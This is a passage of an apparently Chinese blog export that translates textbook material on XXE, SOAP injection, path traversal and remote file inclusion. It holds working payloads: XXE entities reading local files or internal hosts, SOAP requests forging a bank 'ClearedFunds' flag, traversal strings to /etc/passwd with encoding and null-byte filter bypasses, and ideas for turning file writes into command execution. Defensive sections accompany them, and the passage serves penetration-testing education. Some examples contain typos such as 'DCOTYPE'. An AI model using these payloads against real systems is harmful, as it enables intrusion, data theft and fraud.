<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span>[ <span class="meta">&lt;!ENTITY <span class="meta-keyword">testref</span> <span class="meta-string">"testrefvalue"</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果文档中包含以上定义，解析器将用testrefvalue这个已定义的值替代文档中出现在任何&testref;实体引用。</p>
<p>此外，XML规范允许使用外部引用来定义实体，XML解析器将动态提取这些实体的值。这些外部实体定义采用URL格式，并可以引用外部Web URL或本地文件系统上的资源。XML解析器将提取指定URL或文件的内容并将其作为已定义实体的值。如果应用程序在其响应中返回任何使用外部定义的实体的XML数据，则指定文件或URL的内容将在该响应中返回。</p>
<p>攻击者可以通过向XML添加适当的DOCTYPE元素，或通过修改该元素（如果它已经存在），在基于XML的请求中指定外部实体。外部实体引用使用SYSTEM关键字来指定，并使用URL（可能使用file:协议）进行定义。</p>
<p>在前一个示例中，攻击者可以提交以下请求（该请求定义一个引用服务器文件系统上的文件的XML外部实体）：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /search/128/AjaxSearch.ashx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Legth: 44</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DCOTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///windows/win.ini"</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchTerm</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">SearchTerm</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>收到这个请求后，XML解析器将提取指定文件的内容，并使用该内容来替代已定义的实体引用（攻击者已经在SearchTerm元素中使用了该实体引用）。由于SearchTerm元素的值会在应用程序的响应中辉县，这回导致服务器以该文件的内容作出响应。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 556</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchResult</span>&gt;</span>No results found for expression: ; for 16-bit app support </span><br><span class="line">    [fonts]</span><br><span class="line">    [extensions]</span><br><span class="line">    [mci extensions]</span><br><span class="line">    [files]</span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;/<span class="name">SearchResult</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>除使用file:协议来指定本地文件系统上的资源外，攻击者还可以使用http:等协议让服务器通过网络提取资源。这些URL可以指定任意主机、IP地址和端口。攻击者可以利用它们与后端系统上无法通过因特网直接访问的网络服务器进行交互。例如，以下攻击尝试连接到在专用IP地址192.168.1.1的端口25上运行的邮件服务器：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DCOTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.1.1"</span> &gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Search</span>&gt;</span><span class="tag">&lt;<span class="name">SearchTerm</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">SearchTerm</span>&gt;</span><span class="tag">&lt;/<span class="name">Search</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过这种技巧可以实施各种攻击，如下所示：</p>
<ul>
<li>攻击者可以将应用程序作为代理服务器使用，从应用程序能够访问的任何Web服务器上检索敏感内容，包括哪些在组织内部的专用非路由地址空间运行的内容。</li>
<li>攻击者可以利用后端Web应用程序中的漏洞，只要这些漏洞可以通过URL加以利用。</li>
<li>攻击者可以通过攻击大量IP地址和端口号，对后端系统上的开放端口进行测试。在某些情况下，可以使用实践性差异来推断所请求的端口的状态。其他时候，应用程序可能会在响应中返回某些服务的服务标题</li>
</ul>
<p>最后，如果应用程序检索外部实体，但并不在响应中返回该实体，则攻击者仍然可以通过无限期地读取某个文件流，从而实施拒绝服务攻击。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DCOTYPE <span class="meta-keyword">foo</span> [ <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:/// /dev/random"</span> &gt;</span> ]&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="注入SOAP"><a href="#注入SOAP" class="headerlink" title="注入SOAP"></a>注入SOAP</h2><p>SOAP(Simple Object Access Protocol, 简单对象访问协议)是一种使用XML格式封装数据，基于消息的通信技术。各种在不同操作系统和架构上运行的系统也使用它来共享信息和传递消息。它主要用在Web服务器中；通过浏览器访问的Web应用程序常常使用SOAP在后端应用程序组件之间进行通信。</p>
<p>由不同计算机执行单项任务以提高性能的大型企业应用程序经常使用SOAP。采用Web应用程序作为现有应用程序前段的情况也经常可以见到SOAP的身影。这时，应用程序通常使用SOAP在不同组件之间通信，以确保模块性和互用性。</p>
<p>由于XML是一种解释型语言，因此，和前面的描述的其他示例一样，SOAP也易于受到代码注入攻击，XML元素通过元字符&lt;,&gt;和/以语法形式表示。如果用户提交的数据中包含这些字符，并被直接插入到SOAP消息中，攻击者就能够破坏消息的结构，进而破坏应用程序的逻辑或造成其他不利影响。以一个银行应用程序为例，一名用户正使用下面的HTTP请求进行转账：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/27/Default.ashx HTTP/1.0</span><br><span class="line">HOST: mdsec.net</span><br><span class="line">Content-Lenght: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAccount08447656&amp;Submit-Submit</span><br></pre></td></tr></table></figure>

<p>在处理这个请求的过程中，应用程序在两个后端组件之间传送下面的SOAP消息：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelop</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://www/w3/org/2001/12/soap-envelope"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">pre:Add</span> <span class="attr">xmlns:pre</span>=<span class="string">http:..target/lists</span> <span class="attr">soap:encodingStype</span>=<span class="string">"http://www.w3.org/2001/12/soap-encoding"</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">Account</span>&gt;</span></span><br><span class="line">            	<span class="tag">&lt;<span class="name">FromAccount</span>&gt;</span>18281008<span class="tag">&lt;/<span class="name">FromAccount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Amount</span>&gt;</span>1430<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ClearedFunds</span>&gt;</span>False<span class="tag">&lt;/<span class="name">ClearedFunds</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ToAccount</span>&gt;</span>08447656<span class="tag">&lt;/<span class="name">ToAccount</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Account</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pre:Add</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelop</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注意消息中的XML元素如何与HTTP请求中的参数对应起来，以及应用程序如何添加ClearedFunds元素。这时，应用程序逻辑确定账户中没有足够的资金进行转账，并将这个元素ClearedFunds的值设置为False，因此受到SOAP消息的组件将拒绝转账。</p>
<p>在这种情况下，攻击者可以通过各种方法注入SOAP消息，从而破坏应用程序的逻辑。例如，提交下面的请求会在最初的元素之前插入另外一个ClearedFunds元素（同时保持SQL语法的有效性）。如果应用程序处理它遇到的第一个ClearedFunds元素，那么即使账户中没有资金，也可以成功进行转账。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/27/Default.ashx HTTP/1.0</span><br><span class="line">HOST: mdsec.net</span><br><span class="line">Content-Lenght: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span><span class="tag">&lt;<span class="name">ClearedFunds</span>&gt;</span>True<span class="tag">&lt;<span class="name">Amount</span>&gt;</span><span class="tag">&lt;/<span class="name">ClearedFunds</span>&gt;</span>&amp;ToAccount08447656&amp;Submit-Submit</span><br></pre></td></tr></table></figure>

<p>另一方面，如果应用程序处理它遇到的后一个ClearedFunds元素，攻击者就可以在ToAccount参数中注入一个类似的攻击。</p>
<p>另一种类型的攻击时使用XML注释完全删除原始SOAP消息中的一个元素，并用攻击者自己设计的元素代替被删除的元素。例如，下面的请求通过Amount参数注入一个ClearedFunds元素，为ToAccount元素建立一个起始标签，开始一段注释，并在ToAccount参数中结束注释，从而保持XML语法的有效性：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/27/Default.ashx HTTP/1.0</span><br><span class="line">HOST: mdsec.net</span><br><span class="line">Content-Lenght: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span><span class="tag">&lt;<span class="name">ClearedFunds</span>&gt;</span>True<span class="tag">&lt;/<span class="name">ClearedFunds</span>&gt;</span><span class="tag">&lt;<span class="name">ToAccount</span>&gt;</span><span class="comment">&lt;!--&amp;ToAccount=--&gt;</span>08447656&amp;Submit-Submit</span><br></pre></td></tr></table></figure>

<p>另一种攻击是尝试在一个注入的参数内完成整个SOAP消息，并将消息的剩余部分注释掉。但是，由于没有结束注释与起始注释相匹配，这种攻击会生成完全错误的XML语法，从而被许多XML解析器拒绝。这种攻击并不能在所有XML解析库中起作用，它只对定制或自主研发的XML解析器奏效。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/27/Default.ashx HTTP/1.0</span><br><span class="line">HOST: mdsec.net</span><br><span class="line">Content-Lenght: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430<span class="tag">&lt;/<span class="name">Amount</span>&gt;</span><span class="tag">&lt;<span class="name">ClearedFunds</span>&gt;</span>True</span><br><span class="line"><span class="tag">&lt;/<span class="name">ClearedFunds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ToAccount</span>&gt;</span>08447656<span class="tag">&lt;/<span class="name">ToAccount</span>&gt;</span><span class="tag">&lt;/<span class="name">Account</span>&gt;</span><span class="tag">&lt;/<span class="name">pre:Add</span>&gt;</span><span class="tag">&lt;/<span class="name">soap:body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&amp;Submit-Submit</span></span><br></pre></td></tr></table></figure>

<h2 id="查找并利用SOAP注入"><a href="#查找并利用SOAP注入" class="headerlink" title="查找并利用SOAP注入"></a>查找并利用SOAP注入</h2><p>SOAP注入可能很难发现，因为随意提交XML元字符会破坏SOAP消息的格式，而且这样做生成的错误消息也及其简单。但是，使用下面的步骤依然可以相对可靠地检测出SOAP注入漏洞。</p>
<ol>
<li><p>轮流在每个参数中提交一个恶意XML结束标签，如。如果没有发生错误，那么输入可能没有插入到SOAP消息中，或者以某种方式被净化了。</p>
</li>
<li><p>如果出现错误，提交一堆有效的起始与结束标签，如<foo></foo>。如果这对标签使错误消失，那么应用程序可能易于受到攻击。</p>
</li>
<li><p>有些时候，插入到XML格式消息中的数据随后以XML格式被读取并返回给用户。如果修改的数据项在应用程序的响应中返回，看看提交任意XML内容是否以相同的形式返回，或者已通过某种方式被规范化。轮流提交下面两个值：</p>
<p>test<foo></foo></p>
<p>test<foo></foo></p>
<p>如果发现其中一个值的返回结果为另一个值，或者只返回test，那么可以确信输入被插入到了XML消息中。</p>
</li>
<li><p>如果HTTP请求中包含几个可放入SOAP消息的参数，尝试在一个参数中插入起始注释字符/&lt;!–，在另一个参数中插入结束注释字符!–/&gt;。然后，轮换在参数中插入这两个字符。这样做可能会把服务器SOAP消息中的某个部分作为注释处理，从而改变应用程序的逻辑，或者形成一个可造成信息泄露的不同错误条件。</p>
</li>
</ol>
<p>如果SOAP注入很难发现，就更难对其加以利用。许多时候，需要知道数据周围的XML的结构，以提交专门设计的输入，修改消息内容而不致破坏它的结构。在前面描述的所有测试中寻找任何揭示SOAP消息处理细节的错误消息。幸运的话，一条详细的错误消息将透露SOAP消息的完整内容，允许构建专门设计的值查找相关漏洞。如果不够幸运，就只能纯粹猜测，这样攻击成功的几率就非常低。</p>
<h2 id="防止SOAP注入"><a href="#防止SOAP注入" class="headerlink" title="防止SOAP注入"></a>防止SOAP注入</h2><p>我们可以在用户提交的数据被插入SOAP消息中的任何位置实施边界确认过滤，以防止SOAP注入。需要进行过滤的数据包括用户在当前请求中直接提交的数据，以及在前面请求中已经存在或由以用户数据位输入的其他处理过程生成的数据。</p>
<p>为防止上述攻击，应用程序应对出现在用户输入中的任何XML元字符进行HTML编码。HTML编码包含用对应的HTML实体替代字面量字符。这样做可确保XML解释器在进行处理时，把它们当做相关元素的数据值，而不是消息结构的一部分。一些进场造成问题的字符的HTML编码如下：</p>
<ul>
<li>&lt; - &amp;lt</li>
<li>&gt; - &amp;gt</li>
<li>/ - &amp;#47</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>操作文件路径</title>
    <url>/2019/03/27/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-2-%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%20/</url>
    <content><![CDATA[<h1 id="操作文件路径"><a href="#操作文件路径" class="headerlink" title="操作文件路径"></a>操作文件路径</h1><p>如果应用程序使用用户可控制的数据、以危险的方式访问位于应用程序服务器或其他后端文件系统中的文件和目录，就会出现目录遍历漏洞。通过提交专门设计的输入，攻击者就可以在被访问的文件系统中读取或者写入任意内容。这种漏洞往往使攻击者能够从服务器上读取敏感信息或者重写敏感文件，并最终在服务器上执行任何命令。</p>
<p>在下面的示例中，应用程序使用一个动态页面向客户端返回静态图像。被请求的图像名称在查询字符串参数中指定:</p>
<p><strong><a href="http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg" target="_blank" rel="noopener">http://mdsec.net/filestore/8/GetFile.ashx?filename=keira.jpg</a></strong></p>
<p>当服务器处理这个请求时，它执行以下操作。</p>
<p>（1）从查询字符串中提取filename参数值</p>
<p>（2）将这个值附加在C:\filestore\之后</p>
<p>（3）用这个名称打开文件</p>
<p>（4）读取文件的内容，并将其返回客户端</p>
<p>漏洞之所以会发生，是因为攻击者可以将路径遍历序列放入文件名内，从第（2）步指定的图像目录向上回溯，从而访问服务器上的任何文件。众所周知，路径遍历序列表示为“点-点-斜线”（..\），一个典型攻击如下：</p>
<p><strong><a href="http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows.win.ini" target="_blank" rel="noopener">http://mdsec.net/filestore/8/GetFile.ashx?filename=..\windows.win.ini</a></strong></p>
<p>如果应用程序把filename参数的值附加到图像目录名称之后，就得到以下路径：</p>
<p><strong>C:\filestore..\windows\win.ini</strong></p>
<p>这两个遍历序列立即从图像目录回溯到C:驱动器根目录下，因此，前面的路径等同于以下路径：</p>
<p><strong>C:\windows\win.ini</strong></p>
<p>因此，服务器不会返回图像文件，而是返回默认的Windows配置文件。</p>
<h2 id="查找和利用路径遍历漏洞"><a href="#查找和利用路径遍历漏洞" class="headerlink" title="查找和利用路径遍历漏洞"></a>查找和利用路径遍历漏洞</h2><h3 id="确定攻击目标"><a href="#确定攻击目标" class="headerlink" title="确定攻击目标"></a>确定攻击目标</h3><p>在对应用程序进行初步解析的过程中，应该已经去定了素有与路径遍历漏洞有关的明显受攻击面。主要用于文件上传或下载目的地所有功能都应进行全面测试。用户可共享文档的工作流程应用程序，允许用户上传的图像的博客与拍卖应用程序，以及为用户提供电子书。技术手册和公司表表等文档的信息型应用程序，常常使用这种功能。</p>
<p>除这种明显的目标功能外，还有其他各种行为表示应用程序需要与文件系统进行交互。</p>
<ol>
<li>分析在应用程序解析过程中收集到的信息，确定以下内容。<ul>
<li>请求参数中明显包含文件或目录名称的所有情形。例如，include=main.inc或template=/en/sidebar</li>
<li>需要从服务器文件系统读取数据的所有应用程序功能。例如，显示办公文档或图像。</li>
</ul>
</li>
<li>在测试其他漏洞的过程中，寻找有益的错误消息或其他反常事件。设法确定用户提交的数据被传送给文件API或作为操作系统命令参数的所有情况。</li>
<li>如果能从本地访问应用程序，执行以下操作：<ul>
<li>使用适当的工具监控服务器上的所有文件系统活动</li>
<li>在每一个被提交的参数（包括全部cookie、查询字符串字段和POST数据项）中插入一个特殊的字符串测试应用程序的每一个页面。一次仅针对一个参数进行测试</li>
<li>在文件系统监控工具中设置一个过滤器，确定所有包含测试字符串的文件系统事件</li>
<li>如果发现测试字符串被用作文件或目录，或者出现在文件或目录名中，那么对于每一种情况进行测试，确定其是否收到路径遍历攻击。</li>
</ul>
</li>
</ol>
<h3 id="探查路径遍历漏洞"><a href="#探查路径遍历漏洞" class="headerlink" title="探查路径遍历漏洞"></a>探查路径遍历漏洞</h3><p>确定各种潜在的路径测试目标后，必须分别测试每种情况，弄清其是否以不安全的方式向相关文件操作系统传送用户可控制的数据。</p>
<p>在测试用户提交的参数时，需确定遍历序列是否被应用程序阻止，或者他们能够正常工作。通常，提交不会向上回溯到其实目录的遍历序列是一种较为可靠的初步测试方法。</p>
<ul>
<li><p>假设所针对的参数被附加到应用程序预先设定的目标之后，那么插入任意一个子目录和一个遍历序列，修改参数的值。例如，应用程序提交参数</p>
<p><strong>foo=foo/file1.txt</strong></p>
<p>那么可以尝试提交以下值：</p>
<p><strong>foo=foo/bar/../file1.txt</strong></p>
<p>如果两种情况下应用程序的行为完全相同，就表示它易于受到攻击。应该继续测试，尝试通过向上回溯到起始目录来访问不同的文件。</p>
</li>
<li><p>在上述两种情况下，如果应用程序的行为有所不同，那么应用程序可能阻止、删除或净化遍历序列，致使文件路径失效。</p>
<p>即使子目录“bar”并不存在，这个测试仍然有效，因为大多数文件系统在尝试获取文件路径前对其进行了规范化。路径序列删除了虚构的目录，因此服务器并不检查它是否存在。</p>
</li>
</ul>
<p>如果的发现提交遍历序列但不向上回溯至起始目录不会影响应用程序的行为，那么就写来的测试中，应该尝试遍历出起始目录，从服务器文件系统的其他地方访问文件。</p>
<ul>
<li><p>如果所攻击的应用程序功能只拥有文件读取访问权限，那么尝试访问相关操作系统上的一个一致任何用户均可读取的文件。提交下面其中一个值作为受控制的文件名参数：</p>
<p><strong>../../../../../../../../../../../../../etc/password</strong></p>
<p><strong>../../../../../../../../../../../windows/win.ini</strong></p>
</li>
<li><p>如果所攻击的功能拥有文件写入访问权限，那么要最终确定应用程序是否易于受到攻击，可能会更困难。通常，一种有效的测试是尝试写入两个文件，一个文件可被任何用户写入，另一个文件即使是跟用户或管理员也禁止写入。例如，在windows平台上可以尝试写入下面两个文件：</p>
<p><strong>../../../../../../../../../../../tmp/writest.txt</strong></p>
<p><strong>../../../../../../../../../../../../tmp</strong></p>
<p>在上面的每对测试中，如果应用程序在响应两个请求时表现出行为差异，那么应用程序可能易于受到攻击。</p>
</li>
<li><p>还有一种方法可通过写入访问确定遍历漏洞，即尝试在Web服务器的Web根目录中写入一个新文件，然后同时通过浏览器获得这个文件。但是，如果并不知道Web根目录的位置，或者访问文件的用户并不拥有写入权限，这种方法可能不会成功。</p>
</li>
</ul>
<h3 id="避开路径攻击障碍"><a href="#避开路径攻击障碍" class="headerlink" title="避开路径攻击障碍"></a>避开路径攻击障碍</h3><p>最初的遍历尝试攻击并未成功，并不意味着应用程序不容易受到攻击。许多应用程序开发者意识到路径遍历漏洞，并执行各种输入确认检查尝试防止这种漏洞。但是，这些防御措施往往存在缺陷，可被技术熟练的攻击者轻易避开。</p>
<p>第一种常见的输入过滤方法如下，首先检查文件名参数中是否存在任何路径遍历序列，如果存在，要么拒绝包含遍历序列的请求，要么尝试删除该序列，以对输入进行净化。这种类型过滤往往易于受到各种攻击，它们使用编码或其他方法来避开过滤。这类攻击全都利用输入确认机制所面临的规范化问题。</p>
<ul>
<li><p>尝试始终通过使用斜线与反斜线的路径遍历序列进行测试。许多输入过滤仅检查其中一种序列，而文件系统却支持全部两种序列。</p>
</li>
<li><p>尝试使用下面的编码方案，对遍历序列进行简单的URL编码。一定要多输入中的每一个斜线和点进行编码：</p>
<ul>
<li>点——%2e</li>
<li>斜线——%2f</li>
<li>反斜线——%5c</li>
</ul>
</li>
<li><p>尝试使用下面的16位Unicode编码：</p>
<ul>
<li>点——%u002e</li>
<li>斜线——%u2215</li>
<li>反斜线——%u2216</li>
</ul>
</li>
<li><p>尝试使用下面的双倍URL编码：</p>
<ul>
<li>点——%252e</li>
<li>斜线——%252f</li>
<li>反斜线——%255c</li>
</ul>
</li>
<li><p>尝试使用下面的超长UTF-8 unicode编码：</p>
<ul>
<li>点——%c%2e、%e0%40%ae、%c0ae等</li>
<li>斜线——%c0%af、%e0%80%af、%c0%2f等</li>
<li>反斜线——%c0%5c、%c0%80%5c等</li>
</ul>
<p>可以在Burp Intruder中使用非法Unicode有效载荷类型为任何特殊字符生成大量其他形式的表示法，并将它提交到目标参数的相关位置。这些表示法严重违反了Unicode表示法规则，但却为许多Unicode解码器接受，特别是Windows平台上的解码器。</p>
</li>
<li><p>如果应用程序尝试通过删除遍历序列来净化用户输入，但没有以递归的方式应用这种过滤，那么可以用一个序列来替换另一个序列来避开过滤。例如：</p>
<ul>
<li><strong>….//</strong></li>
<li><strong>…./\</strong></li>
<li><strong>….\\</strong></li>
</ul>
</li>
</ul>
<p>第二种防御路径遍历攻击时常用的输入过滤，就是确认用户提交的输入是否包含应用程序想要的后缀或前缀。这种类型的防御可以与前面描述的过滤联合使用。</p>
<ul>
<li><p>一些应用程序检查用户提交的文件是否以一种或特殊的文件类型结尾，并决绝访问其他内容的请求，有时候，可以在请求的文件名后放入一个URL编码的空字节，在后面连接应用程序接受的文件类型，从而避开这种检查。例如：</p>
<p><strong>../../../../../boot.ini%00.jpg</strong></p>
<p>这种攻击有时会成功，是因为应用程序使用API在托管执行环境下执行文件类型检查，该执行环境允许字符串包含空字符。但是，当获取文件时，应用程序最终在一个无法控制的环境中使用API，因此文件名被截短为想要的值。</p>
</li>
<li><p>一些应用程序将它们自己的文件类型后缀附加在用户提交的文件名后，尝试控制被访问的文件类型。在这种情况下，基于相同的原因，前面的任何一种利用都可能取得成功。</p>
</li>
<li><p>一些应用程序检查用户提交的文件名的开头部分是否为起始目录的某一个子目录，或者一个特殊的文件名。当然，通过以下方法可轻易避开这种检查：</p>
<p><strong>filestore/../../../../../../../etc/password</strong></p>
</li>
<li><p>如果以上针对输入过滤的攻击都无法成功，可能应用程序实施了几种类型的过滤，因此需要同时使用上面的几种攻击方法。遇到这种情况，如有可能，最好的方法是将问题分解成几个独立的阶段。例如，如果请求</p>
<p>diagram1.jpg</p>
<p>能够成功，但请求</p>
<p>foo/../diagram1.jpg</p>
<p>却导致失败，那么尝试使用所有可能的遍历序列，知道第二个请求获得成功。如果使用这些成功的遍历序列仍然无法访问/etc/password，就请求一下文件，检查应用程序是否实施任何文件类型过滤，以及是否可以避开这种过滤：</p>
<p>diagram1.jpg%00.jpg</p>
<p>彻底检查应用程序定义的起始目录，设法了解它实施的全部过滤，看是否可以利用上述技巧避开每一种过滤。</p>
</li>
<li><p>当然，如果能够随意访问应用程序，那么攻击就变得简单，因为渗透测试员可以系统性地攻击每种输入，并确定最终通过哪些文件名可以到达文件系统。</p>
</li>
</ul>
<h3 id="处理定制编码"><a href="#处理定制编码" class="headerlink" title="处理定制编码"></a>处理定制编码</h3><p>应用程序采用的文件名编码方案最终以危险的方式进行处理，模糊处理也不能提供任何安全保障，这时就会出现最为可怕的路径遍历漏洞。</p>
<p>例如，一些应用程序具有某种工作流程功能，允许用户上传下载文件，执行上传操作的请求提供一个文件名参数，它在写入文件时易于受到路径遍历攻击。如果一个文件成功上传，那么应用程序再为用户提供一个下载URL。这里有两点值得注意：</p>
<ul>
<li>应用程序核对将要写入的文件是否已经存在，如果存在，就拒绝重写这个文件。</li>
<li>为下载用户文件而生成的URL使用一种定制模糊处理方案表示。这种方案似乎是一种定制的Base64编码形式，它在每个编码文件名位置使用一组不同的字符。</li>
</ul>
<p>总的来说，这些注意点给直接利用漏洞设置了障碍。首先，尽管能够给在服务器文件系统中写入任何文件，但攻击者无法重写任何现有文件，而且，Web服务器进程有用较低权限意味着攻击者不可能在任何有力位置创建新文件。其次，如果不对定制编码进行逆向工程，攻击者也不可能请求任意一个现有的文件。</p>
<h3 id="利用遍历漏洞"><a href="#利用遍历漏洞" class="headerlink" title="利用遍历漏洞"></a>利用遍历漏洞</h3><p>可以利用读取访问路径遍历漏洞从包含有用信息的服务器上获取有益的文件，或者帮助优化针对其他漏洞的攻击，如下所示。</p>
<ul>
<li>操作系统与应用程序的密码文件</li>
<li>服务器与应用程序配置文件，以发现其他漏洞或优化另一次攻击</li>
<li>可能含有数据库帧数的包含文件</li>
<li>应用程序使用的数据源，如MySQL数据库文件或XML文件</li>
<li>服务器可执行页面的源代码，以执行代码审查，搜索漏洞</li>
<li>可能包含用户名和会话令牌的应用程序日志文件等</li>
</ul>
<p>如果发现一个允许写入访问的路径遍历漏洞，那么渗透测试的主要目标应该是利用它在服务器上执行任意命令。利用漏洞实现这一目标的方法包括以下几种：</p>
<ul>
<li>在用户的启动文件夹中创建脚本</li>
<li>当用户下一次连接时，修改in.ftpd等文件执行任意命令</li>
</ul>
<p>向一个拥有执行许可的Web目录写入脚本，从浏览器调用它们。</p>
<h2 id="防止路径遍历漏洞"><a href="#防止路径遍历漏洞" class="headerlink" title="防止路径遍历漏洞"></a>防止路径遍历漏洞</h2><p>迄今为止，避免向任何文件系统API传送用户提交的数据时防止路径遍历漏洞的最有效方法。许多时候，包含在最初的GetIFile.aspx?filename=keira.jpg示例中，应用程序完全没有必要实施防御。因为大多数文件都没有采用访问控制，攻击者可以将这些文件存入Web根目录中，再通过URL直接访问。如果以上方法行不通，应用程序可能会保存一个可由页面处理的硬编码图像文件列表，并使用不同的标识符指定需要的文件。任何包含无效标识符的请求都可能遭到拒绝，因为没有受攻击面可供用户利用，使其操纵页面提供的文件路径。</p>
<p>有时，与实现文件上传与下载的工作流程一样，应用程序可能需要允许用户通过名称指定文件，这时，开发者可能采用最简单的方法，将用户提交的用户名传送给文件系统API。从而达到这种目的。在这种情况下，应用程序应实施深层防御措施，为路径遍历攻击设立几层障碍。</p>
<p>以下是一些可能有用的防御方法，在应用过程中，最好将它们组合在一起使用。</p>
<ul>
<li>对用户提交的文件名进行相关解码与规范化之后，应用程序应检查该文件名是否包含路径遍历序列（使用反斜线或斜线）或孔子杰。如果是这样，应用程序应停止处理请求，不得尝试对恶意文件名进行任何净化处理。</li>
<li>应用程序应使用一个硬编码的。允许访问的文件类型列表，并决绝任何访问其他文件类型的请求（完成上述解码与规范化之后）。</li>
<li>对用户提交的文件名进行一切必要的过滤后，应用程序应使用适当的文件系统API确认是否一切正常，以及使用该文件名访问的文件是否位于应用程序指定的起始目录中。</li>
</ul>
<p>应用程序可以使用一个chrooted环境访问包含被访问文件的目录，减轻大多数路径遍历漏洞造成的影响。在这种情况下，chrooted目录就好比是文件系统的根目录，任何视图从这个目录向上回溯的多余遍历请求都被忽略。大多数UNIX平台支持chrooted文件系统。在Windows平台上，以新逻辑驱动器形式安装相关起始目录，并且使用响应的驱动器字母访问目录内容，即可实现类似的效果。</p>
<p>应用程序应将其路径遍历攻击防御机制与日志和警报机制整合在一起。任何时候，只要收到一个包含路径遍历序列的请求，提出请求的用户就可能心存恶意，应用程序应在日志中进行记录，表明该请求企图违反安全机制，并终止该用户的会话。如有可能，应冻结该用户账户并向管理员发出警报。</p>
<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>许多脚本语言支持使用包含文件（include file）。这种功能允许开发者把可重复使用的代码插入到单个的文件中，并在需要时将它们包含在特殊功能的代码文件中。然后，包含文件中的代码被解释，就好像它插入到包含指令的位置一样。</p>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>PHP语言特别容易出现文件包含漏洞，因为它的包含函数接受远程文件路径。这种缺陷已经成为PHP应用程序中大量漏洞的根源。</p>
<p>以一个想不通位置的人们传送各种内容的应用程序为例。用户选择他们的位置后，这个信息通过一个请求参数传送给服务器，代码如下：</p>
<p><strong><a href="https://wahh-app.com/main.php?Country=US" target="_blank" rel="noopener">https://wahh-app.com/main.php?Country=US</a></strong></p>
<p>应用程序通过以下方式处理Country参数：</p>
<p><strong>$country = $_GET[‘Country’]</strong></p>
<p><strong>include($country . ‘.php’)</strong></p>
